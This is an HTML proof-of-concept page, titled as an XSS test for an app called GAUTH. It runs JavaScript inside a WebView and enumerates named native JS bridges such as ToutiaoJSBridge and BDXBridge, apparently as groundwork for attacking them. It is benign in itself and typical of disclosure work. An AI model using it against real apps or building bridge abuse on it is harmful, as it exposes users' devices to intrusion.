<!doctype html>
<html>
  <body>
    <h1>GAUTH XSS POC</h1>
    <p>If you see this inside the app, JS is running in the WebView.</p>

    <script>
      alert("WebView controlled");

      // After 2 seconds, check which JS bridges are available
      setTimeout(function () {
        var msg = [];

        if (window.JS2NativeBridge) {
          msg.push("JS2NativeBridge");
        }
        if (window.BDXBridge) {
          msg.push("BDXBridge");
        }
        if (window.ToutiaoJSBridge) {
          msg.push("ToutiaoJSBridge");
        }
        if (window.__WebViewRequest) {
          msg.push("__WebViewRequest");
        }
        if (window.__WebViewReport) {
          msg.push("__WebViewReport");
        }

        if (msg.length === 0) {
          alert("Available bridges: none");
        } else {
          alert("Available bridges: " + msg.join(", "));
        }
      }, 2000);
    </script>
  </body>
</html>
